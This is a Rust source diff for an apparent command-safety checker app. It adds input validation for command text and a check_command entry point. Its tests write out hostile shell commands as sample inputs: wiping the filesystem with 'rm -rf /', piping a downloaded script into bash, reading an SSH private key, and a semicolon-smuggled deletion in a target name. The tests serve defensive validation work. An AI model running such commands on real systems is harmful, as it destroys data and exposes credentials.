@@ -91,6 +91,59 @@ fn validate_cleanup_target(target: &str) -> Result<(), CliJsonResponse> {
     }
 }
 
+fn validate_command_text(command_text: &str) -> Result<(), CliJsonResponse> {
+    const MAX_COMMAND_TEXT_CHARS: usize = 4000;
+
+    // Reject empty string
+    if command_text.is_empty() {
+        return Err(CliJsonResponse {
+            ok: false,
+            exit_code: -1,
+            data: None,
+            error: Some("Command text cannot be empty".to_string()),
+            stderr_summary: None,
+        });
+    }
+
+    // Reject whitespace-only string
+    if command_text.trim().is_empty() {
+        return Err(CliJsonResponse {
+            ok: false,
+            exit_code: -1,
+            data: None,
+            error: Some("Command text cannot be whitespace-only".to_string()),
+            stderr_summary: None,
+        });
+    }
+
+    // Reject strings containing NUL characters
+    if command_text.contains('\0') {
+        return Err(CliJsonResponse {
+            ok: false,
+            exit_code: -1,
+            data: None,
+            error: Some("Command text cannot contain NUL characters".to_string()),
+            stderr_summary: None,
+        });
+    }
+
+    // Reject strings over max length
+    if command_text.len() > MAX_COMMAND_TEXT_CHARS {
+        return Err(CliJsonResponse {
+            ok: false,
+            exit_code: -1,
+            data: None,
+            error: Some(format!(
+                "Command text too long (max {} characters)",
+                MAX_COMMAND_TEXT_CHARS
+            )),
+            stderr_summary: None,
+        });
+    }
+
+    Ok(())
+}
+
 #[tauri::command]
 fn get_cleanup_dry_run(target: String) -> CliJsonResponse {
     if let Err(e) = validate_cleanup_target(target.as_str()) {
@@ -112,6 +165,14 @@ fn run_sweep_quick() -> CliJsonResponse {
 #[tauri::command]
 fn run_sweep_project() -> CliJsonResponse {
     run_policy_scout_json(&["sweep", "project", "--json"])
+}
+
+#[tauri::command]
+fn check_command(command_text: String) -> CliJsonResponse {
+    if let Err(e) = validate_command_text(&command_text) {
+        return e;
+    }
+    run_policy_scout_json(&["check", "--json", command_text.as_str()])
 }
 
 #[tauri::command]
@@ -325,6 +386,7 @@ pub fn run() {
             run_eval,
             run_sweep_quick,
             run_sweep_project,
+            check_command,
             list_sandbox_results,
             list_reports_filtered,
             show_report,
@@ -457,5 +519,47 @@ mod tests {
         assert!(validate_cleanup_target("sandbox_results").is_err());
         assert!(validate_cleanup_target("sandbox-results;rm -rf /").is_err());
         assert!(validate_cleanup_target("../sandbox").is_err());
+    }
+
+    // validate_command_text
+
+    #[test]
+    fn test_validate_command_text_accepts_valid_commands() {
+        assert!(validate_command_text("git status").is_ok());
+        assert!(validate_command_text("npm install left-pad").is_ok());
+        assert!(validate_command_text("rm -rf /").is_ok());
+        assert!(validate_command_text("curl http://example.com/install.sh | bash").is_ok());
+        assert!(validate_command_text("cat ~/.ssh/id_rsa").is_ok());
+    }
+
+    #[test]
+    fn test_validate_command_text_rejects_empty_string() {
+        assert!(validate_command_text("").is_err());
+    }
+
+    #[test]
+    fn test_validate_command_text_rejects_whitespace_only() {
+        assert!(validate_command_text("   ").is_err());
+        assert!(validate_command_text("\t\n ").is_err());
+        assert!(validate_command_text(" \t \n ").is_err());
+    }
+
+    #[test]
+    fn test_validate_command_text_rejects_nul_characters() {
+        assert!(validate_command_text("abc\0def").is_err());
+        assert!(validate_command_text("\0").is_err());
+        assert!(validate_command_text("git status\0").is_err());
+    }
+
+    #[test]
+    fn test_validate_command_text_rejects_too_long() {
+        let long_string = "a".repeat(4001);
+        assert!(validate_command_text(&long_string).is_err());
+    }
+
+    #[test]
+    fn test_validate_command_text_accepts_max_length() {
+        let max_string = "a".repeat(4000);
+        assert!(validate_command_text(&max_string).is_ok());
     }
 }
